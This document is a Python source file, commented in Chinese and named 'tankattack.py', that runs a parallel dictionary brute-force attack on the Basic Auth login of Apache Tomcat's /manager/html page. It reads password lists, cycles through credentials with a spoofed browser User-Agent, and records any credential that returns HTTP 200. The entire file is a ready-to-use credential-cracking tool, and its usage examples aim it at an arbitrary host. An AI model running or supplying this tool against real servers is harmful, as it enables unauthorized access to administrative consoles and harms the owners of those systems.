from multiprocessing import Queue, Process 
from multiprocessing.sharedctypes import Value 
from pathlib import Path 
import argparse 
import base64 
import datetime 
import http.client 
import signal 
import sys 
import textwrap 
import threading 
import time 

successfile = open('successfile.log', 'a') 
# 计数器，用于计数总共破解了多少个密码 
counter = Value('i', 0) 
# 密码是否已找到 
iskeyfound = Value('b', False) 

def crack(host, crequeue, recycledqueue, iskeyfound, counter, logqueue): 
    httpconn = http.client.HTTPConnection(host) 
    while 1: 
        # 时该注意是否有其它兄弟已经找到了KEY，找到了我也不干活了 
        if(iskeyfound.value): 
            httpconn.close() 
            break 
        comb = crequeue.get() 
        # 处理到尾部结束标记，所有密码都猜完了，处理破解时发生异常的密码 
        if(comb is None): 
            if not recycledqueue.empty(): 
                comb = recycledqueue.get() 
            else: 
                break 
        constr = base64.b64encode(comb.encode('utf-8')) 
        b64str = constr.decode('utf-8') 
        headers = { 
            "Connection": "close", 
            "Authorization": "Basic " + b64str, 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"} 
        try: 
            httpconn.request(method="GET", url="/manager/html", headers=headers) 
            reps_code = httpconn.getresponse().status 
        except http.client.HTTPException as e: 
            # 将破解异常的凭证扔到列表里，最后再处理 
            logqueue.put(("[-] 捕获到异常，凭证 %s重新放回队列。异常原因：%s" % (comb, e))) 
            recycledqueue.put(comb) 
        if(str(reps_code) == "200"): 
            tmp_str = str('[+] 破解成功!!!Key => %s  ,返回码：%s' % (comb, reps_code)) 
            logqueue.put(tmp_str) 
            # 登陆凭证已找到,当前线程退出，并告诉其它兄弟别再瞎忙活了 
            iskeyfound.value = True 
            successfile.write(tmp_str + "\n") 
            break 
        else: 
            logqueue.put('[+] 尝试登陆组合 %s ,返回码：%s' % (comb, reps_code)) 
        counter.value += 1 


def getargs(): 
    # * A high-efficiency automatic program used for cracking Apache Tomcat\'s log-on credential, Powered by Tank  * 
    parser = argparse.ArgumentParser(prog='tankattack.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\ 
    For Example: 
    ----------------------------------------------------------------------------- 
    python tankattack.py --host 127.0.0.1:8080 --user admin -p 4 -t 4 -d I:/dict 
    python tankattack.py --host www.testorg.com --user admin -p 4 -t 4 -d I:/dict''')) 
    parser.add_argument('--host', metavar='host', type=str, help=' the host of target,including port') 
    parser.add_argument('--user', metavar='name', type=str, help=' the name you are to crack') 
    parser.add_argument('-p', metavar='process', type=int, help=' The amount of processes that used to crack') 
    parser.add_argument('-t', metavar='threads', type=int, help=' The amount of threads per process') 
    parser.add_argument('-d', metavar='directory', type=str, help=' The directory of passworld files') 
   
    if(len(sys.argv[1:]) / 2 != 5): 
        sys.argv.append('-h') 
    return parser.parse_args() 


def CreateCredentials(crequeue): 
    ''' 
       向队列插入用户名和密码 
    ''' 
    p = Path(dict) 
    # 读取该目录下所有以txt结尾的文件，包括子目录 
    dictfiles = p.glob('*/*.txt') 
    for dictfile in dictfiles: 
        f_dict = open(str(dictfile), 'r') 
        for line in f_dict: 
            line = line.strip() 
            if(line): 
                crequeue.put(user + ":" + line) 
        f_dict.close() 
    # 所有密码读取完毕，在结尾插入结束标记 
    for i in range(maxProcesses * threadnum): 
        crequeue.put(None) 


def task(host, crequeue, maxProcesses, recycledqueue, iskeyfound, counter, logqueue): 
    mythreads = [] 
    for i in range(threadnum): 
        # 主线程退出时，子线程也要退出 
        t = threading.Thread(target=crack, args=(host, crequeue, recycledqueue, iskeyfound, counter, logqueue), daemon=True) 
        t.start() 
        mythreads.append(t) 
     
    for t in mythreads: 
        t.join() 

def printlog(logqueue): 
    while 1: 
        print(logqueue.get()) 

if __name__ == '__main__': 
    paramsargs = getargs() 
    maxProcesses = paramsargs.p 
    threadnum = paramsargs.t 
    dict = paramsargs.d 
    host = paramsargs.host 
    user = paramsargs.user 
    recycledqueue = Queue() 
    crequeue = Queue(maxsize=10000) 
    # 日志队列 
    logqueue = Queue() 
    print('[+] 破解开始 .... ') 
    starttime = datetime.datetime.now() 
    # 开启一个进程将密码读取到队列中 
    threading.Thread(target=CreateCredentials, args=(crequeue,), daemon=True).start() 
    # 日志读取 
    threading.Thread(target=printlog, args=(logqueue,), daemon=True).start() 
    cnProcesses = [] 
    for i in range(maxProcesses): 
        # 主进程退出时，子进程也要退出 
        cn = Process(target=task, args=(host, crequeue, maxProcesses, recycledqueue, iskeyfound, counter, logqueue), daemon=True) 
        cn.start() 
        cnProcesses.append(cn) 
    # 等待所有进程结束 
    for p in cnProcesses: 
        p.join() 
    # 程序退出，打印程序执行时间 
    counter = counter.value 
    finishetime = datetime.datetime.now() 
    ptime = finishetime - starttime 
    print(str('[+] 程序执行完成！共猜解 %i 个组合，共用时 %s\ 
                    ' % (counter, time.strftime('%H:%M:%S', time.gmtime(ptime.seconds)))))